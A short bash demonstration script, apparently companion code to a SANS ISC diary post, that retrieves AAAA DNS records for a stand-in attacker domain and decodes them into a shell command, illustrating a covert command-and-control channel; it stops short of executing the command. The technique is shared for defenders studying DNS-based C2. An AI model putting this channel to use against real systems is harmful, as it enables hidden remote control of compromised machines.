#!/usr/bin/env bash

##
#
#  This script will read the AAAA records for
#  "a.evilexample.com", and decode them into a shell
#  command to be executed. The goal is to use a DNS
#  record type less noisy then the usual TXT record
#
#  The script stops short of actually executing the
#  command for your safety.
#
#  More details:
#  https://isc.sans.edu/forums/diary/Command+and+Control+Channels+Using+AAAA+DNS+Records/21301/
#
#  created by Johannes Ullrich jullrich@sans.edu.
#  Creative Commons Attribution-NonComercial-ShareAlike license
#  https://creativecommons.org/licenses/by-nc-sa/4.0/
##

dig +short AAAA a.evilexample.com | sort | cut -f 2- -d':' | tr -d ':' | xxd -r -p


